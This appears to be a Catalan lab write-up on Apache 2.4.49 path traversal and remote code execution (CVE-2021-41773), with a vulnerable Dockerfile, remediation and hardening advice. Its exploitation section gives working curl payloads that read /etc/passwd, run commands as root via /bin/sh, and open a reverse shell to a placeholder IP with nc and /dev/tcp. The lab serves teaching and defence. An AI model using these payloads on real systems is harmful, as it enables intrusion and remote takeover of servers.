# Servei 1: Apache 2.4.49 - CVE-2021-41773 Path Traversal i RCE

## Descripció Breu

Apache HTTP Server 2.4.49 conté una vulnerabilitat de Path Traversal que permet a un atacant accedir a fitxers fora del directori arrel del servidor web. Si el modul CGI esta activat, la vulnerabilitat escalona a Remote Code Execution (RCE), permetent executar comandes arbitraries al servidor. Aquesta vulnerabilitat va ser activament explotada en la natura pocs dies despres de la seva publicacio.

---

## Objectius de Seguretat Afectats

- **Confidencialitat** -> Lectura de fitxers arbitraris del sistema (/etc/passwd, claus privades, etc.)
- **Integritat** -> Execucio de comandes arbitraries amb RCE via CGI
- **Disponibilitat** -> Possible aturada del servei o del sistema

---

## Risc i Impacte

| Aspecte | Detall |
|---|---|
| **Nivell de risc** | Critic |
| **CVE** | CVE-2021-41773 |
| **CVSS Score** | 7.5 (Path Traversal) / 9.8 (RCE amb CGI) |
| **Versio afectada** | Apache 2.4.49 exclusivament |
| **Versio corregida** | Apache 2.4.51+ |

---

## Implementació Vulnerable

```dockerfile
# Vulnerable: Apache 2.4.49 - CVE-2021-41773
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    wget build-essential libpcre3-dev libssl-dev \
    zlib1g-dev libexpat1-dev libapr1-dev libaprutil1-dev

RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.gz && \
    tar -xzf httpd-2.4.49.tar.gz && \
    cd httpd-2.4.49 && \
    ./configure --enable-cgi --enable-cgid --with-mpm=prefork && \
    make && make install

RUN mkdir -p /usr/local/apache2/cgi-bin && \
    echo '#!/bin/bash' > /usr/local/apache2/cgi-bin/test.sh && \
    chmod +x /usr/local/apache2/cgi-bin/test.sh

EXPOSE 80
CMD ["/usr/local/apache2/bin/httpd", "-D", "FOREGROUND"]
```

---

## Com Explotar

### Pas 1: Verificar la versio vulnerable
```bash
curl -v http://localhost:9001/ 2>&1 | grep "Server:"
# Output: Server: Apache/2.4.49 (Unix)
```

### Pas 2: Path Traversal - llegir fitxers del sistema
```bash
# Llegir /etc/passwd via path traversal
curl --path-as-is http://localhost:9001/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

# Output: root:x:0:0:root:/root:/bin/bash
# daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Pas 3: Remote Code Execution via CGI
```bash
# Executar comandes arbitraries
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" \
     "http://localhost:9001/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

# Output: uid=0(root) gid=0(root) groups=0(root)
```

### Pas 4: Obtenir una shell inversa
```bash
# En una terminal, posar-se a l'escolta
nc -lvnp 4444

# En una altra terminal, llançar la connexio inversa
curl -s --path-as-is \
     -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/<IP>/4444 0>&1" \
     "http://localhost:9001/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

---

## Solució

Actualitzar a Apache 2.4.51 o superior i aplicar configuracio segura:

```dockerfile
FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y apache2
RUN a2dismod cgi cgid autoindex status
RUN echo 'ServerTokens Prod' >> /etc/apache2/apache2.conf
RUN echo 'ServerSignature Off' >> /etc/apache2/apache2.conf
```

### Verificació de la correcció
```bash
# Path traversal no funciona
curl --path-as-is http://localhost:9002/cgi-bin/.%2e/.%2e/etc/passwd
# Output: 404 Not Found

# La versio del servidor no s'exposa
curl -v http://localhost:9002/ 2>&1 | grep "Server:"
# Output: Server: Apache
```

---

## Bones Practiques

- Actualitzar Apache immediatament quan surtin pegats de seguretat
- Desactivar CGI si no es estrictament necessari
- Restringir l'acces al sistema de fitxers amb directives Directory
- Ocultar la versio del servidor amb ServerTokens Prod
- Subscriure's a les alertes de seguretat d'Apache

---

## Referencies

- [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [Apache Security Advisory](https://httpd.apache.org/security/vulnerabilities_24.html)
- [PoC Exploit](https://github.com/blasty/CVE-2021-41773)
